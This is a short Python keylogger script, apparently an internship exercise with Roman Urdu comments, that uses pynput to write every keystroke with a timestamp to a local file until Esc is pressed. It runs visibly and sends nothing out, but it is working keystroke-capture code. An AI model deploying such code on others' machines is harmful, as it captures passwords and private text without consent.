from pynput.keyboard import Key, Listener
import logging
import os

# 1. File Path Set Karna
# Humne 'r' prefix use kiya hai taakay path mein koi error na aaye
log_dir = r"E:\ARCH TECH Internship"
log_file = os.path.join(log_dir, "keylog.txt")

# 2. Logging Configuration
logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Key ko capture karke log file mein save karna 
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # 'Esc' key dabane par script band ho jayegi
    if key == Key.esc:
        return False

# 3. Keylogger Start Karna [cite: 7]
print("Keylogger is running... Press 'Esc' to stop and save the file.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()